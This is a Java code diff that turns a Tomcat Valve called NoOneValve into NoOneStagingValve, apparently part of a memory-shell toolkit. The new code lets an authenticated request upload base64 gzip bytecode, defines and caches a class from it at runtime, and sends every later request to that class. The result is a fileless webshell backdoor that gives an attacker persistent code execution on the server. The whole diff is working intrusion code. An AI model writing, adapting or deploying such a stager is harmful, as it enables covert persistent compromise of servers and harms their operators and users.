@@ -6,50 +6,54 @@ import org.apache.catalina.connector.Response;
 
 import javax.servlet.ServletException;
 import javax.servlet.ServletOutputStream;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
- * @since 2025/8/29
+ * @since 2026/3/15
  */
-public class NoOneValve extends ClassLoader implements Valve {
+public class NoOneStagingValve extends ClassLoader implements Valve {
 
-    private static Class<?> coreClass = null;
-    private static String coreGzipBase64;
+    private static volatile Class<?> adaptorClass = null;
 
-    public NoOneValve() {
+    public NoOneStagingValve() {
     }
 
-    public NoOneValve(ClassLoader parent) {
+    public NoOneStagingValve(ClassLoader parent) {
         super(parent);
     }
 
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
         try {
-            if (isAuthed(request)) {
-                try {
-                    byte[] payload = transformReqPayload(getArgFromRequest(request));
-                    if (coreClass == null) {
-                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = new NoOneValve(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
-                    }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.newInstance();
-                    httpChannelCore.equals(new Object[]{payload, outputStream});
-                    ServletOutputStream responseOutputStream = response.getOutputStream();
-                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
-                    responseOutputStream.write(data);
-                    wrapResponse(response);
-                    responseOutputStream.flush();
-                    responseOutputStream.close();
+            if (adaptorClass != null) {
+                if (adaptorClass.newInstance().equals(new Object[]{request, response})) {
                     return;
-                } catch (Throwable e) {
-                    e.printStackTrace();
                 }
+            }
+            if (isAuthed(request)) {
+                ServletOutputStream responseOutputStream = response.getOutputStream();
+                try {
+                    if (adaptorClass == null) {
+                        synchronized (NoOneStagingValve.class) {
+                            if (adaptorClass == null) {
+                                byte[] payload = transformReqPayload(getArgFromRequest(request));
+                                byte[] bytes = gzipDecompress(decodeBase64(new String(payload, "UTF-8")));
+                                adaptorClass = new NoOneStagingValve(Thread.currentThread().getContextClassLoader())
+                                        .defineClass(bytes, 0, bytes.length);
+                            }
+                        }
+                    }
+                    byte[] data = wrapResData(transformResData("ok".getBytes("UTF-8")));
+                    responseOutputStream.write(data);
+                } catch (Throwable e) {
+                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
+                }
+                wrapResponse(response);
+                responseOutputStream.flush();
+                responseOutputStream.close();
+                return;
             }
         } catch (Throwable ignored) {
         }
@@ -61,7 +65,7 @@ public class NoOneValve extends ClassLoader implements Valve {
     }
 
     private byte[] getArgFromRequest(Object request) {
-        return null;
+        return new byte[0];
     }
 
     private byte[] transformReqPayload(byte[] input) {
@@ -110,6 +114,13 @@ public class NoOneValve extends ClassLoader implements Valve {
             }
             out.close();
         }
+    }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
     }
 
     Valve next;
